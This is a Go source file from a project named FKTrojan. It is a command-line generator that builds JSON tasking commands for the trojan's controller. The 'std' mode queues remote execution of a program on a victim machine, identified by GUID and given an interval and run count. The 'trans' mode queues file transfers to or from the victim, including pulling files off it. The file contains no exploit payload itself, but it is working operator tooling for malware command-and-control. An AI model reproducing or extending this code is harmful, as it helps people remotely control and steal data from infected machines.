package main

import (
	"FKTrojan/dao"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
)

type CMD struct {
	Command     string          `json:"command"`
	GUID        string          `json:"guid"`
	RunCount    int             `json:"run_count"`
	IntervalSec int             `json:"interval_sec"`
	Code        dao.CommandCode `json:"code"`
}

func main() {
	if len(os.Args) < 3 {
		fmt.Printf("error para")
		os.Exit(1)
	}
	switch os.Args[1] {
	case "std":
		{
			if len(os.Args) < 6 {
				fmt.Printf("error std para")
				os.Exit(1)
			}
			cmdstr := make([]string, 0)
			cmdstr = append(cmdstr, os.Args[5:]...)
			interval, err := strconv.Atoi(os.Args[3])
			if err != nil {
				fmt.Printf("interval (os.Args[3]) must be integer %v", err)
				return
			}
			count, err := strconv.Atoi(os.Args[4])
			if err != nil {
				fmt.Printf("count (os.Args[4]) must be integer %v", err)
				return
			}
			cmd := CMD{
				Command:     strings.Join(cmdstr, "|"),
				Code:        dao.CMD_RUN_EXE,
				GUID:        os.Args[2],
				IntervalSec: interval,
				RunCount:    count,
			}
			b, _ := json.MarshalIndent(cmd, " ", " ")
			fmt.Println((string(b)))
		}
	case "trans":
		{
			if len(os.Args) < 7 {
				fmt.Printf("error trans para")
				os.Exit(1)
			}
			interval, err := strconv.Atoi(os.Args[3])
			if err != nil {
				fmt.Printf("interval (os.Args[3]) must be integer %v", err)
				return
			}
			var code dao.CommandCode
			switch os.Args[4] {
			case "s_to_c":
				code = dao.CMD_TRANS_S_TO_C
				break
			case "c_to_s":
				code = dao.CMD_TRANS_C_TO_S
				break
			default:
				{
					fmt.Printf("unknown transfer direction %s", os.Args[4])
					os.Exit(1)
				}
			}
			cmd := CMD{
				Command:     strings.Join(os.Args[5:], "|"),
				Code:        code,
				GUID:        os.Args[2],
				IntervalSec: interval,
				RunCount:    1,
			}
			b, _ := json.MarshalIndent(cmd, " ", " ")
			fmt.Println((string(b)))
		}
	}
}
